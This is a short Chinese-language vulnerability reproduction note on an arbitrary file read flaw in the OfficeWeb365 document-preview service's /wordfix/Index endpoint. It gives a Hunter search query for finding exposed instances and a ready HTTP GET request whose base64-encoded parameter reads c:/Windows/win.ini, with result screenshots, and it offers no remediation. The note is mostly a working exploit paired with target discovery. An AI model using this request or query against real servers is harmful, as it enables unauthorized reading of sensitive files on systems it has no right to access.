# OfficeWeb365 wordfix存在任意读取漏洞

# 一、漏洞简介
OfficeWeb365是西安大西信息科技有限公司开发的，专注于Office文档在线预览及PDF文档在线预览云服务，包括Microsoft Word文档在线预览、Excel表格在线预览、Powerpoint演示文档在线预览，WPS文字处理、WPS表格、WPS演示及Adobe PDF文档在线预览。广泛应用于OA办公系统、招聘网站、在线教育类网站，提高客户体验、增加产品竞争力。OfficeWeb365 /wordfix/Indexs接口处存在任意文件读取漏洞，攻击者可通过独特的加密方式对payload进行加密，读取任意文件，获取服务器敏感信息，使系统处于极不安全的状态。

# 二、影响版本
+ OfficeWeb365

# 三、资产测绘
+ hunter：`app.name="OfficeWeb365"`

![1692028029052-65569f24-4578-4a92-a007-d93c1b5b8f94.png](./img/1uGoArCQ7SLdakCW/1692028029052-65569f24-4578-4a92-a007-d93c1b5b8f94-682048.png)

+ 登录页面

![1692028081742-18ce6201-05b3-4e01-a21c-4eca8dcf2636.png](./img/1uGoArCQ7SLdakCW/1692028081742-18ce6201-05b3-4e01-a21c-4eca8dcf2636-126524.png)

# 四、漏洞复现
```plain
GET /wordfix/Index?f=YzovV2luZG93cy93aW4uaW5p HTTP/2
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Upgrade-Insecure-Requests: 1
```

![1705936378459-10dffce2-93e7-4f55-aba9-2cef52979109.png](./img/1uGoArCQ7SLdakCW/1705936378459-10dffce2-93e7-4f55-aba9-2cef52979109-574409.png)



> 更新: 2024-02-29 23:55:51  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/aywxwlh86qyygfg7>